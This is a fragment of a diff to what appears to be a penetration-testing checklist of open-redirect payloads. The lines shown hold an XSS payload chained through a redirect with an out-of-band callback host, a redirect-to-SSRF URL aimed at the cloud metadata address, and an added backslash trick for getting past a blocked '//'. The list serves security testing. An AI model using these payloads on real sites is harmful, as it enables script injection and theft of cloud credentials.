@@ -23,3 +23,4 @@
     `https://a4qpwq97.eu1.ctfio.com/leaving?next=https%3A%2F%2F503lipuecghx2pnhe9hopr5bj2ptdn1c.oastify.com"><img src=x onerror=confirm()>`
 
 - [ ] `https://victim.com/image?url=../../../redirect?target=http://169.254.169.254/latest/meta-data`: for OR to SSRF
+- [ ] Use \\ to bypass a blacklisted //  `?=\\evil.com` 
